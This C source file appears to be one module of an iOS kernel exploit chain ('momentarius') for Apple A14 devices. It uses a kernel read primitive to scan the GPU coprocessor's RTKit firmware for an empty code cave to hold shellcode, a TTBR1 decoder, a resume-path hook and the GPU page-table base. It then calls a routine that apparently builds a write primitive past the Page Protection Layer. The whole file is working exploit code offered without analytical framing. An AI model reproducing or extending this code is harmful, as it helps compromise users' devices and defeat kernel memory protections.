#include <stddef.h>
#include <stdint.h>
#include <string.h>

#include "momentarius.h"
#include "utils.h"

#define A14_RTKTEXT_SCAN_SIZE 0x48000U
#define A14_CAVE_START        0x0A80U
#define A14_CAVE_END          0x1000U

#define A64_BL_OPCODE_MASK    0xFC000000U
#define A64_BL_OPCODE         0x94000000U
#define A64_MSR_TTBR1_X0      0xD5182020U
#define A64_MRS_SCTLR_X0      0xD5381000U
#define A64_CMP_X1_ZERO       0xF100003FU
#define A64_RET               0xD65F03C0U

static const uint8_t a14_bptp_tag[8] = {
    'B', 'P', 'T', 'P', 0x08, 0x00, 0x00, 0x00
};

static uint8_t a14_page_buf[A14_PAGE_SIZE];

static uint32_t a14_read32(const uint8_t *page, uint32_t offset) {
    uint32_t value = 0;
    memcpy(&value, page + offset, sizeof(value));
    return value;
}

static uint64_t a14_read64(const uint8_t *page, uint32_t offset) {
    uint64_t value = 0;
    memcpy(&value, page + offset, sizeof(value));
    return value;
}

static bool a14_bytes_equal(const uint8_t *page, uint32_t offset,
                            const uint8_t *expected, size_t size) {
    return memcmp(page + offset, expected, size) == 0;
}

static bool a14_range_is_zero(const uint8_t *page, uint32_t start, uint32_t end) {
    if (start >= end || end > A14_PAGE_SIZE) return false;
    for (uint32_t i = start; i < end; i++) {
        if (page[i] != 0) return false;
    }
    return true;
}

static bool a14_decode_bl_target(uint32_t from, uint32_t instruction,
                                 uint32_t *target) {
    if ((instruction & A64_BL_OPCODE_MASK) != A64_BL_OPCODE || target == NULL) {
        return false;
    }

    int32_t immediate = (int32_t)((instruction & 0x03FFFFFFU) << 6) >> 6;
    int64_t destination = (int64_t)from + ((int64_t)immediate << 2);
    if (destination < 0 || destination >= A14_PAGE_SIZE) return false;

    *target = (uint32_t)destination;
    return true;
}

static bool a14_validate_ttbr_decoder(const uint8_t *page, uint32_t offset) {
    static const uint32_t expected[] = {
        0xAA0003E2U, /* mov x2, x0 */
        0x52800103U, /* mov w3, #8 */
        0x38401441U, /* ldrb w1, [x2], #1 */
        0xB3401C20U, /* bfxil x0, x1, #0, #8 */
        0x93C02000U, /* ror x0, x0, #8 */
        0x71000463U, /* subs w3, w3, #1 */
    };

    if (offset > A14_PAGE_SIZE - 0x20U) return false;
    for (uint32_t i = 0; i < sizeof(expected) / sizeof(expected[0]); i++) {
        if (a14_read32(page, offset + i * sizeof(uint32_t)) != expected[i]) {
            return false;
        }
    }

    return a14_read32(page, offset + 0x1CU) == A64_RET;
}

static int a14_find_resume_path(const uint8_t *page) {
    uint32_t ttbr1_msr = 0;
    uint32_t decoder = 0;

    for (uint32_t offset = sizeof(uint32_t);
         offset <= A14_PAGE_SIZE - sizeof(uint32_t);
         offset += sizeof(uint32_t)) {
        if (a14_read32(page, offset) != A64_MSR_TTBR1_X0) continue;

        uint32_t candidate = 0;
        if (!a14_decode_bl_target(offset - sizeof(uint32_t),
                                  a14_read32(page, offset - sizeof(uint32_t)),
                                  &candidate)) {
            continue;
        }
        if (!a14_validate_ttbr_decoder(page, candidate)) continue;

        if (ttbr1_msr != 0) return -1; /* Ambiguous firmware layout. */
        ttbr1_msr = offset;
        decoder = candidate;
    }

    if (ttbr1_msr == 0 || decoder == 0) return -1;

    uint32_t sctlr = 0;
    uint32_t search_end = ttbr1_msr + 0x200U;
    if (search_end > A14_PAGE_SIZE) search_end = A14_PAGE_SIZE;

    for (uint32_t offset = ttbr1_msr + sizeof(uint32_t);
         offset < search_end;
         offset += sizeof(uint32_t)) {
        if (a14_read32(page, offset) == A64_MRS_SCTLR_X0) {
            sctlr = offset;
            break;
        }
    }
    if (sctlr == 0) return -1;

    uint32_t hook = 0;
    search_end = sctlr + 0x100U;
    if (search_end > A14_PAGE_SIZE - sizeof(uint32_t)) {
        search_end = A14_PAGE_SIZE - sizeof(uint32_t);
    }

    for (uint32_t offset = sctlr + sizeof(uint32_t);
         offset <= search_end;
         offset += sizeof(uint32_t)) {
        if (a14_read32(page, offset) != A64_CMP_X1_ZERO) continue;
        if ((a14_read32(page, offset + sizeof(uint32_t)) & A64_B_COND_MASK) !=
            A64_B_COND_OPCODE) {
            continue;
        }
        if (hook != 0) return -1;
        hook = offset;
    }
    if (hook == 0) return -1;

    momentarius.gfx.a14.ttbr1_msr_offset = ttbr1_msr;
    momentarius.gfx.a14.ttbr_decode_offset = decoder;
    momentarius.gfx.a14.resume_hook_offset = hook;
    return 0;
}

static int a14_find_bptp(uint64_t text_kva) {
    uint32_t match = 0;
    uint32_t match_page = 0;

    /* Scan only pages confirmed through the trusted kernel tables (text_kva).
       A linear text_pa + page_offset scan faults on scattered AGX pages
       (T8101: uncatchable LLC bus error). */
    for (uint32_t page_offset = 0;
         page_offset < A14_RTKTEXT_SCAN_SIZE;
         page_offset += A14_PAGE_SIZE) {
        kreadbuf(text_kva + page_offset, a14_page_buf, A14_PAGE_SIZE);

        for (uint32_t offset = 0;
             offset <= A14_PAGE_SIZE - sizeof(a14_bptp_tag) - sizeof(uint64_t);
             offset++) {
            if (!a14_bytes_equal(a14_page_buf, offset, a14_bptp_tag,
                                 sizeof(a14_bptp_tag))) {
                continue;
            }
            if (match != 0) return -1; /* Require one unique patchbay record. */
            match = page_offset + offset;
            match_page = page_offset;
        }
    }

    if (match == 0) return -1;

    if (gfx_a14_page_pa(match_page) == 0) {
        debug_log("A14 fail-closed: BPTP page (text+0x%x) has no confirmed runtime mapping\n",
                  match_page);
        return -1;
    }

    kreadbuf(text_kva + match_page, a14_page_buf, A14_PAGE_SIZE);
    uint32_t value_offset = match + sizeof(a14_bptp_tag);
    uint32_t in_page = value_offset & (A14_PAGE_SIZE - 1U);
    uint64_t ttbr_pa = a14_read64(a14_page_buf, in_page);

    if (ttbr_pa == 0 || (ttbr_pa & (A14_PAGE_SIZE - 1U)) != 0 ||
        !GFX_PA_VALID(ttbr_pa)) {
        debug_log("A14 BPTP was found, but its runtime value is not a valid TTBR PA\n");
        return -1;
    }

    momentarius.gfx.a14.bptp_offset = match;
    momentarius.gfx.a14.bptp_value_offset = value_offset;
    momentarius.gfx.ttbr_pa = ttbr_pa;
    return 0;
}

int momentarius_init_A14(void) {
    uint64_t text_kva = gfx_a14_text_kva();
    if (text_kva == 0) return -1;

    kreadbuf(text_kva, a14_page_buf, A14_PAGE_SIZE);

    momentarius.gfx.text_size = A14_RTKTEXT_SCAN_SIZE;

    if (!a14_range_is_zero(a14_page_buf, A14_CAVE_START, A14_CAVE_END)) {
        debug_log("A14 executable-padding candidate is not empty\n");
        return -1;
    }
    momentarius.gfx.a14.code_cave_offset = A14_CAVE_START;
    momentarius.gfx.a14.code_cave_size = A14_CAVE_END - A14_CAVE_START;

    if (a14_find_resume_path(a14_page_buf) != 0) {
        debug_log("A14 RTKit resume path did not match the expected semantics\n");
        return -1;
    }
    if (a14_find_bptp(text_kva) != 0) return -1;

    momentarius.gfx.ttbr_kva = gfx_phystokv(momentarius.gfx.ttbr_pa);
    if (!KADDR_VALID(momentarius.gfx.ttbr_kva)) return -1;

    momentarius.gfx.method = 2;
    momentarius.gfx.shc_offset = A14_CAVE_START;
    momentarius.gfx.ttbr1_load_offset = momentarius.gfx.a14.ttbr_decode_offset;
    momentarius.gfx.hook_offset = momentarius.gfx.a14.resume_hook_offset;

    debug_log("A14 BPTP: text+0x%x (value text+0x%x)\n",
              momentarius.gfx.a14.bptp_offset,
              momentarius.gfx.a14.bptp_value_offset);
    debug_log("A14 TTBR1 decoder: text+0x%x; msr: text+0x%x\n",
              momentarius.gfx.a14.ttbr_decode_offset,
              momentarius.gfx.a14.ttbr1_msr_offset);
    debug_log("A14 resume hook candidate: text+0x%x\n",
              momentarius.gfx.a14.resume_hook_offset);
    debug_log("A14 executable padding: text+0x%x..0x%x\n",
              momentarius.gfx.a14.code_cave_offset,
              momentarius.gfx.a14.code_cave_offset +
                  momentarius.gfx.a14.code_cave_size);

    return momentarius_build_ppl_write();
}
